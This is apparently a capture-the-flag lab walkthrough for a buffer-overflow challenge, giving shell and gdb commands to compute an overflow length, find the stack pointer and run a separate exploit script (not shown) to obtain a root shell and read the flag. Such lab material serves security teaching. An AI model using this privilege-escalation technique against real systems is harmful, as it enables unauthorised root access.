
# CTF 4 - BOF

## SETUP

1. Deploy your challenge instance
1. Open a terminal and connect to your instance with:

    ``` bash
    ssh {unix_username}@syssec-lab.s3.eurecom.fr -p {port_number}
    ```

1. In your home directory, create a file called "exploit" and copy the content of **[`exploit`](exploit)**

    ```bash
    vi $HOME/exploit
    ```

    *Save and quit with `:wq`*

## ATTACK

1. Compute the length of the string that will be passed to the vulnerable program

    ```bash
    echo $(($(grep -e "+[0-9]" $HOME/bof/vuln.c | sed 's/.*+\([0-9]\+\)\].*/\1/')/16*16 + 97))
    ```

1. Navigate to ./bof and run ./runner under gdb

    ```bash
    cd $HOME/bof
    env - gdb ./runner
    ```

1. Get the address of the stack pointer by runnig the following lines:

    ``` bash
    unset env LINES
    unset env COLUMNS
    b 24
    y
    r `perl -e 'print "A" x {string_length}'`
    p/x $esp
    ```

    The address of your stack pointer will be printed.

    > Example:  
      $1 = 0xffffffff

    Save this address and quit gdb

    ```bash
    q
    y
    ```

1. Run *exploit* with the address you just got

    ```bash
    bash $HOME/exploit {esp_address}
    ```

    > Example:  
      bash $HOME/exploit 0xffffffff

1. Once you get the root shell, you can cat the flag

    ```bash
    cat arena/flag
    ```
